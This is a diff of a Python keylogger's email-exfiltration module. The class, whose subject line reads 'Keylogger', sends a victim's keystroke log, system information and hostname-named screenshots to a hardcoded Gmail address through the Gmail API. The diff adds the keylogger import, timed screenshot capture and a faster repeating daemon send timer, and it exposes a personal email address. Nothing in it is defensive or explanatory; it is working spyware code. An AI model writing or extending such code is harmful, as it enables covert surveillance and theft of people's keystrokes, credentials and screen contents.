@@ -1,6 +1,4 @@
-import os
-import pickle
-import threading
+import os, pickle, socket, threading
 
 from email.mime.audio import MIMEAudio
 from email.mime.base import MIMEBase
@@ -17,14 +15,17 @@ from email.mime.multipart import MIMEMultipart
 from mimetypes import guess_type as guess_mime_type
 
 from pcInfo import info
+from functions import keyloggerFn
+
 iPc = info.infoPc()
+keyloggerFn = keyloggerFn.keylogger()
 
 class sndEmail:
     def __init__(self, destination = 'adrian.cristian.st@gmail.com', obj = 'Keylogger',
-                 body = f'{iPc}', attachments = ["logs/log.txt"]):
-        self.destination = destination
-        self.obj = obj
-        self.body = body
+                 body = f'{iPc}', attachments = ["logs/log.txt", f"{socket.gethostname()}.png"]):
+        self.__destination = destination
+        self.__obj = obj
+        self.__body = body
         self.__attachments = attachments
 
         self.scopes = ['https://mail.google.com/']
@@ -57,19 +58,23 @@ class sndEmail:
 
         send_message(
             service,
-            self.destination,
-            self.obj,
-            self.body,
+            self.__destination,
+            self.__obj,
+            self.__body,
             self.__attachments,
         )
 
-        timer = threading.Timer(20, self.timeToSend)
+        timer = threading.Timer(5, self.timeToSend)
+        timer.daemon = True
         timer.start()
 
 
-
 def add_attachment(message: MIMEMultipart, filename: str):
+    timer = threading.Timer(2, keyloggerFn.screenshot)
+    timer.start()
+    
     content_type, encoding = guess_mime_type(filename)
+
     if content_type is None or encoding is not None:
         content_type = 'application/octet-stream'
     main_type, sub_type = content_type.split('/', 1)
